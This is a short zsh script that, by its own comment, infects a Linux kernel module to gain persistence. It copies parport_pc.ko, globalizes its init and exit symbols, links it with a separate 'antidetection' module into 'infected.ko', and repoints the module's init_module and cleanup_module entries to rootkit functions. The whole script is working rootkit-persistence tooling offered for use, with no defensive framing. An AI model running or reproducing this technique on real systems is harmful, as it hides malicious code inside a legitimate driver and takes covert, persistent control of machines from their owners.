#!/usr/bin/env zsh
# Infect kernel module to achieve persistence

name=parport_pc.ko

sudo cp $(find /lib/modules/`uname -r`/ -name ${name}) . &&
echo "Before globalize: ${name}" &&
readelf -s ${name} | grep -e parport_pc_init -e parport_pc_exit -e init_module -e cleanup_module &&
objcopy ${name} g${name} --globalize-symbol parport_pc_init \
    --globalize-symbol parport_pc_exit &&
echo "After globalize: g${name}" &&
readelf -s g${name} | grep -e parport_pc_init -e parport_pc_exit -e init_module -e cleanup_module &&
make --quiet &&
ld -r g${name} antidetection.ko -o infected.ko &&
echo "Before change symbols: infected.ko" &&
readelf -s infected.ko | grep -e init_rootkit -e cleanup_rootkit -e init_module -e cleanup_module -e parport_pc_init -e parport_pc_exit &&
./setsym infected.ko init_module $(./setsym infected.ko init_rootkit) &&
./setsym infected.ko cleanup_module $(./setsym infected.ko cleanup_rootkit) &&
echo "After change symbols: infected.ko" &&
readelf -s infected.ko | grep -e init_rootkit -e cleanup_rootkit -e init_module -e cleanup_module -e parport_pc_init -e parport_pc_exit